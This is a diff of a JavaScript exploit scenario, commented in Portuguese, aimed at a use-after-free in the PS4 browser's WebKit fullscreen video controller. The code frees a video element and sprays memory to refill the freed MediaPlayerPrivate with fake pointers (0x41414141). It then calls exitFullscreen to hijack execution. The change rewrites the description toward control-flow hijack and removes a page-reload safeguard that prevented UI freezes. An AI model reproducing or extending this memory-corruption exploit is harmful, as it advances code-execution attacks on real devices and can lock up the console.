@@ -1,4 +1,3 @@
-
 /**
  * CENÁRIO: VIDEO_FULLSCREEN_REMOVE (Fase de Exploração / Control)
  * Alvo: FullscreenVideoController::exitFullscreen()
@@ -8,7 +7,7 @@ export default {
     id:       'VIDEO_FULLSCREEN_REMOVE',
     category: 'Media',
     risk:     'HIGH',
-    description: 'Retorno à base estável. Tenta substituir o MediaPlayerPrivate freed com ponteiros falsos (0x41414141). Usa reload para evitar soft-brick da UI.',
+    description: 'Tenta substituir o MediaPlayerPrivate freed com ponteiros falsos (0x41414141) para controlar a execução (PC/RIP hijack).',
 
     setup: async function() {
         this.container = document.createElement('div');
@@ -33,12 +32,10 @@ export default {
 
     trigger: async function() {
         try {
-            // Entra no Fullscreen de forma estável (sem bloqueio)
             if (this.video.webkitRequestFullscreen) this.video.webkitRequestFullscreen();
             await new Promise(r => setTimeout(r, 100));
 
             // 1. FREE: Apagamos o vídeo
-            // Observação do Leandro: A thread do JS costuma travar exatamente aqui.
             this.video.remove();
 
             // 2. REUSE (SPRAY): Tentamos preencher o buraco deixado pelo vídeo
@@ -52,17 +49,8 @@ export default {
 
             // 3. USE: Disparamos o controlador. 
             // Se ele ler o nosso 0x41414141 como se fosse um ponteiro de função,
-            // a PS4 vai dar crash imediato (CE-34878-0)!
+            // a PS4 vai dar crash imediato (CE-34878-0) tentando executar a morada 0x41414141!
             if (document.webkitExitFullscreen) document.webkitExitFullscreen();
-
-            // 4. A REDE DE SEGURANÇA (Da V12.00):
-            // Forçamos o recarregamento da página para impedir o congelamento
-            // definitivo da UI da consola. Se o Crash Azul não acontecer,
-            // o navegador apenas reinicia limpo, pronto para nova varredura.
-            setTimeout(() => {
-                location.reload();
-            }, 500);
-
         } catch(e) {}
     },
 
